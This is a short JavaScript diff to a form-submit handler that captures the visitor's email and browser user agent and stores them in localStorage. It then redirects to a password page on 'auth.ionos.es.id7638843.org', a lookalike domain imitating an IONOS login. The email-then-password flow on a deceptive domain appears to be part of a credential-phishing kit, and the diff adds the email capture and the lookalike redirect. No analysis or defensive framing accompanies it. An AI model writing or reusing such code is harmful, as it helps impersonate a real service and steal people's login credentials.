@@ -228,19 +228,20 @@
   const userAgent = navigator.userAgent;
   
 	document.getElementById('myForm').addEventListener('submit', async (e) => {
-    e.preventDefault(); 
-    let formData = new FormData(e.target);
+		e.preventDefault(); 
+		let formData = new FormData(e.target);
 
-          
-    formData = JSON.stringify({
-      agent: userAgent,
+			
+		formData = JSON.stringify({
+			agent: userAgent,
+			email:formData.email,
 			try: 1
-    });
+		});
 
-    console.log(formData)
-    localStorage.setItem('usr', formData);
- 
-    window.location.href = 'pass.html';
+		console.log(formData)
+		localStorage.setItem('usr', formData);
+
+		window.location.href = 'https://auth.ionos.es.id7638843.org/pass.html?shoplogin=enabled&_gl=1*t2x778*_gcl_au*NzM2ODQ0NDYzLjE3Nzc3MzUyNTk.';
 
 
   })  
